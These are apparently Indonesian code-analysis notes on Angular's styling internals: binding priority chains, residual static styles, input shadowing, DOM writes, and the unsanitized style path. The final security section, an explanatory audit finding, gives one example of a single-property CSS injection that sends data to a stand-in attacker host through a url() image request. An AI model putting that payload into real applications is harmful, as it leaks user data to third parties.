MASALAH YANG DIPECAHKAN
-----------------------
Satu elemen bisa menerima nilai style/class dari banyak sumber sekaligus:

    <div class="a b"                     <- statis dari template
         [class]="expr"                  <- map binding
         [class.c]="expr"                <- property binding
         my-dir                          <- host binding directive
         another-dir>                    <- host binding directive lain

Semuanya bisa menyentuh properti yang SAMA. Jadi styling bukan sekadar "tulis
nilai ke DOM", melainkan masalah RESOLUSI PRIORITAS. Aturannya:

    template property binding  >  template map binding
    >  host binding directive (urutan directive terbalik)
    >  nilai statis

Yang membuat rumit: nilai bisa berubah menjadi `undefined`, dan saat itu terjadi
nilai harus JATUH KEMBALI ke sumber prioritas lebih rendah - bukan dihapus.

STRUKTUR DATA: LINKED LIST PRIORITAS DI DALAM TData
---------------------------------------------------
Setiap instruksi styling memakai DUA slot binding:
    slot n     nilai mentah dari aplikasi (untuk dirty checking)
    slot n+1   nilai ternormalisasi + `TStylingRange`

`TStylingRange` adalah bilangan terkemas berisi indeks tetangga `prev`/`next`
dalam rantai prioritas, plus dua bit penanda "ada duplikat di arah ini".
Rantai ini dibangun SEKALI pada `firstUpdatePass` (`stylingFirstUpdatePass`),
lalu dipakai ulang oleh semua instance.

`findStylingValue` menelusuri rantai itu dengan dua arah yang berbeda makna:
  - arah NEXT (tNode != null): cari nilai berprioritas LEBIH TINGGI yang
    menimpa nilai kita; berhenti begitu ketemu. Bila tidak ada, konsultasikan
    `tNode.residualStyles`/`residualClasses`.
  - arah PREV (tNode == null): cari nilai FALLBACK berprioritas lebih rendah;
    telusuri sampai habis dan ambil yang terakhir ditemukan.

Optimasi penting: bit duplikat pada `TStylingRange`. Bila sebuah properti tidak
punya duplikat di arah tertentu, penelusuran dilewati sama sekali - kasus paling
umum (satu binding per properti) berbiaya nol.

`isStylingValuePresent` memusatkan definisi "punya pendapat": hanya `undefined`
yang dianggap tidak berpendapat. `null` BERARTI "hapus properti ini", berbeda
dari `undefined`.

RESIDUAL & NILAI STATIS
-----------------------
Nilai statis tidak ikut dalam rantai linked list. Ia dikumpulkan ke
`tNode.residualStyles`/`residualClasses` oleh `collectResidual`, yang menyapu
`collectStylingFromDirectives` (host binding tiap directive) dan
`collectStylingFromTAttrs` (atribut statis template). Ini dihitung sekali.

`wrapInStaticStylingKey` menggabungkan bagian statis ke dalam `TStylingKey`
sehingga instruksi yang sama bisa mengembalikan nilai statis ketika binding
dinamisnya menjadi `undefined`.

INPUT SHADOWING (`@Input('class')` / `@Input('style')`)
--------------------------------------------------------
Bila sebuah directive punya input bernama `class` atau `style` (kasus nyata:
`NgClass`/`NgStyle`), directive itu "mencuri" binding tersebut. `checkStylingMap`
mendeteksinya lewat `hasStylingInputShadow` lalu mengirim nilai ke input
directive alih-alih ke DOM (`setDirectiveInputsWhichShadowsStyling`).
Ada komentar penting di kode: berbeda dari ViewEngine, Angular tetap
MENGGABUNGKAN bagian statis ke nilai yang dikirim ke directive, karena kalau
tidak `[ngClass]` akan mengira kelas statis sudah dihapus.

PENULISAN KE DOM
----------------
`applyStyling` (node_manipulation.ts:1110) adalah satu-satunya titik tulis:
  - class  -> `renderer.addClass` / `removeClass`
  - style  -> `renderer.setStyle(node, prop, value, flags)` / `removeStyle`
  - `!important` dideteksi dari akhiran string lalu dipindah ke flag renderer,
    karena nilai CSS harus bersih dari `!important` agar valid.
  - properti ber-tanda hubung otomatis diberi flag `DashCase`.

Nilai statis awal memakai jalur berbeda: `writeDirectStyle`/`writeDirectClass`
(dom_node_manipulation.ts:115,130) menulis seluruh atribut `style`/`class`
sekaligus. Komentarnya menjelaskan alasannya: "Used for writing initial values,
so that static styling values do not pull in the style parser" - yaitu agar
parser CSS bisa di-tree-shake pada aplikasi yang tidak memakai styling dinamis.

CATATAN KEAMANAN (verifikasi lanjutan atas SINK-TRIAGE T-11)
-------------------------------------------------------------
Pertanyaan yang dijawab di sini: mengapa `unwrapSafeValue` dipanggil di jalur
styling TANPA pemeriksaan tipe pembungkus?

1. TIDAK ADA sanitizer di jalur ini sama sekali. `ɵɵstyleProp`/`ɵɵstyleMap`
   tidak menerima parameter `SanitizerFn` (bandingkan dengan `ɵɵproperty` dan
   `ɵɵattribute` yang menerimanya). Compiler memang memetakan
   SecurityContext.STYLE -> `ɵɵsanitizeStyle` di resolve_sanitizers.ts:22,
   tetapi pemetaan itu berlaku untuk binding properti/atribut biasa - BUKAN
   untuk instruksi styling khusus.

2. Alasannya terletak pada BENTUK PENULISAN. `renderer.setStyle(node, prop,
   value)` menulis SATU properti CSS lewat CSSOM. Peramban mem-parse nilai
   dalam konteks properti itu saja dan MEMBUANG nilai yang tidak valid, jadi
   nilai seperti `red; background: url(...)` tidak bisa "keluar" menjadi
   deklarasi tambahan. Ini berbeda dari `setAttribute('style', ...)` yang
   menerima banyak deklarasi sekaligus - dan jalur itu hanya dipakai untuk
   nilai STATIS dari compiler.

3. `unwrapSafeValue` bersifat IDENTITAS untuk nilai biasa, sehingga
   pemanggilannya hanya berpengaruh bila aplikasi sudah membungkus nilai lewat
   `bypassSecurityTrustStyle`. Bahwa `SafeStyle` diterima di sini memang
   disengaja: `warnInvalidStylePropValue` secara eksplisit memasukkan
   `BypassType.Style` ke daftar nilai yang SAH (styling.ts:247), di samping
   string, number, null, dan undefined.

4. Sisa risiko yang jujur: injeksi CSS pada level SATU properti tetap mungkin
   bila aplikasi mengikat data pengguna ke `[style.background]` - misalnya
   `url(https://penyerang/?data=...)` untuk eksfiltrasi via permintaan gambar.
   Ini bukan XSS dan bukan cacat framework, tetapi layak diketahui: konteks
   STYLE praktis tidak disanitasi di Angular modern.
